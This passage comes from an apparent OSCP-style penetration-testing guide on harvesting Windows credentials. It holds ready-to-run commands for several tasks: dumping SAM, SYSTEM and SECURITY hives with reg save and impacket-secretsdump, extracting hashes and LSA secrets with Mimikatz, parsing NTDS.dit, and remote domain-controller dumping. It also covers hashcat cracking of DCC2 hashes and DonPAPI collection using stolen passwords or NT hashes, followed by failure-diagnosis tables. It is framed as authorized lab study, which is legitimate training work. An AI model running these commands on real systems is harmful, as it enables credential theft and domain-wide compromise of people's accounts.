text: id="5-sam-and-system-local-identities">9.6.2.5 SAM and SYSTEM: local identities reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL Mimikatz alternative from a suitable elevated context: privilege::debug token::elevate lsadump::sam Interpret a typical account row as: LOCAL_USER:RID:LM_HASH:NT_HASH::: The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential. <h2

title: 9.6.2.6 SECURITY and SYSTEM: LSA secrets and cached domain verifiers
text: id="6-security-and-system-lsa-secrets-and-cached-domain-verifiers">9.6.2.6 SECURITY and SYSTEM: LSA secrets and cached domain verifiers reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL Mimikatz alternative: privilege::debug token::elevate lsadump::secrets lsadump::cache Potential categories: $MACHINE.ACC : member computer's domain-account secret/key material; service/autologon secrets: usefulness depends on whether the service/account remains active; NL$1 -style cached logon data: DCC2/MSCache v2 verifier material. DCC2 is for offline guessing, not Pass-the-Hash: hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule Verify the exact format with the installed Hashcat examples before cracking. <h2

title: 9.6.2.7 Credential Manager and DPAPI
text: id="7-credential-manager-and-dpapi">9.6.2.7 Credential Manager and DPAPI cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext. DPAPI reasoning: PROTECTED BLOB -> MASTER-KEY GUID -> USER OR MACHINE PROTECT SCOPE -> MASTER-KEY DECRYPTION MATERIAL -> APPLICATION-SPECIFIC DECODING Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete. <h2

title: 9.6.2.8 NTDS and replication paths
text: id="8-ntds-and-replication-paths">9.6.2.8 NTDS and replication paths <h3

title: 9.6.2.8.1 Offline NTDS from an already controlled DC
text: id="offline-ntds-from-an-already-controlled-dc">9.6.2.8.1 Offline NTDS from an already controlled DC An offline parse needs a matched NTDS.dit and SYSTEM hive: impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material. <h3

title: 9.6.2.8.2 Remote collection
text: id="remote-collection">9.6.2.8.2 Remote collection impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST' impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST' This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use DCSync . <h2

title: 9.6.2.9 Credential routing
text: id="credential-routing">9.6.2.9 Credential routing Open scalable SVG | Open PNG <h2

title: 9.6.2.10 Classify before choosing the transition
text: id="9-classify-before-choosing-the-transition">9.6.2.10 Classify before choosing the transition Output Type Immediate compatible possibilities Not valid as Cleartext password Reusable secret Password authentication, key derivation, DPAPI where applicable Proof of authorization NT hash NTLM key Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported Net-NTLM response or DCC2 AES128/AES256 key Kerberos long-term key Request Kerberos material using compatible tooling Direct NTLM authentication .kirbi / ccache Kerberos ticket container Use while valid for its client/realm/ SPN scope Password/hash DCC2/MSCache v2 Offline verifier Offline cracking PTH DPAPI key/blob Protected-data material Decrypt only with matching context/keys General logon credential Machine-account key Computer identity Map the computer account's rights and Kerberos/NTLM paths Human/domain-admin identity Every newly usable identity returns to Block 10 before movement: VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES <h2

title: 9.6.2.11 Failure router
text: id="10-failure-router">9.6.2.11 Failure router Symptom Interpretation Next action privilege::debug fails Token is not elevated or privilege is unavailable Verify integrity/privileges; use another authorized source LSASS open/dump denied PPL/Credential Guard/EDR/token limitation Confirm protection state; do not infer no credentials Dump parser architecture/version error Tool/dump incompatibility Match architecture and compatible OS/tool build Password : (null) Provider did not retain cleartext Inspect typed hashes/keys/tickets; do not force a cleartext assumption SAM parse boot-key error SYSTEM/SAM mismatch or damaged export Reacquire matched hives from the same state SECURITY output shows cached domain values only Offline verifiers, not reusable NT hashes Use the correct offline format Credential Manager lists target but no secret Reference is context/application-bound Test through the owning authorized context or DPAPI chain DPAPI blob cannot decrypt Missing master key/protecting context/material Map blob → GUID → protect scope → key Remote secretsdump denied Remote admin/registry/replication prerequisite absent Stop broad retries; determine which source/right was actually expected DRS request denied Effective domain-root replication rights absent Validate the exact ACEs ; local admin is irrelevant <h2

title: 9.6.2.12 Tooling for this section
text: id="tooling-for-this-section">9.6.2.12 Tooling for this section Tool Choose it when Requirements Baseline Decisive output Failure cue klist Current Windows ticket inventory Windows logon session; elevation for some LUIDs klist Client, server/SPN, validity and cache Empty cache or inaccessible LUID Mimikatz Source/rights justify live or offline credential parsing Trusted compatible build; appropriate privilege privilege::debug , selected sekurlsa / lsadump command Typed secret tied to identity/logon PPL/CG/EDR, architecture or token failure ProcDump/ comsvcs.dll Authorized LSASS dump for offline analysis Elevated process access; writable destination Section 4 Complete dump file Access denied/blocking/partial dump reg save Matched local registry hives Administrator/SYSTEM or backup-capable context Sections 5–6 Successful hive exports Access denied or mismatched point-in-time files impacket-secretsdump Parse matched hives or use a validated remote/DRS path Installed version, selected source and its privilege -sam/-system LOCAL or narrow DRS request Correctly typed rows Boot-key mismatch, remote-right or DRS failure cmdkey / vaultcmd Locate saved credential targets/types Current user context cmdkey /list Target/type/user clues Listed entry without exportable secret Hashcat Offline guessing of a classified verifier Correct mode, candidate list/rule and compute -m 2100 for DCC2, -m 1000 for NTLM Recovered candidate verified against artifact Token-length/format/mode mismatch <h2

title: 9.6.2.13 DonPAPI — remote DPAPI/application-secret collection with host rights
text: id="donpapi--remote-dpapiapplication-secret-collection-with-host-rights">9.6.2.13 DonPAPI — remote DPAPI/application-secret collection with host rights Use after confirming the accepted identity has the required administrative/remote access on this Windows host. SMB, remote operations and the available masterkey material affect what can be decrypted; ordinary domain-user authentication is not enough. <h3

title: 9.6.2.13.1 One named host and one relevant collector, not automatic whole-domain targeting
text: id="variant-9-6-2-13-1">9.6.2.13.1 One named host and one relevant collector, not automatic whole-domain targeting # One named host and one relevant collector, not automatic whole-domain targeting donpapi collect -d DOMAIN -u USER -p 'PASSWORD' -t TARGET -c CredMan <h3

title: 9.6.2.13.2 Distinct authentication material: the tool expects LMHASH:NTHASH form
text: id="variant-9-6-2-13-2">9.6.2.13.2 Distinct authentication material: the tool expects LMHASH:NTHASH form # Distinct authentication material: the tool expects LMHASH:NTHASH form donpapi collect -d DOMAIN -u USER \ -H 'aad3b435b51404eeaad3b435b51404ee:HASH' -t TARGET -c CredMan Read: distinguish acquired encrypted artifacts from decrypted credentials and identify each artifact's profile/application. Remote Registry/SAM/LSA operations can require service-control rights and alter service state. Bring the relevant password/hash/masterkey/PVK when needed; --fetch-pvk is not a default action and requires additional domain rights. An empty result can be a collection or decryption failure. Validate a recovered identity before moving. Sources: upstream 1 . <h2

title: 9.6.2.14 Sources
text: id="sources">9.6.2.14 Sources Supplied PEN-200, Chapter 23, especially pp758–767 and pp779–784. OffSec OSCP+ Body of Knowledge Microsoft Windows authentication credential processes Microsoft LSA protection Microsoft Credential Guard Mimikatz sekurlsa and lsadump Impacket secretsdump Microsoft PsTools/ProcDump getSH Active Directory route , source snapshot e1f62dd Hexdump Active Directory module .
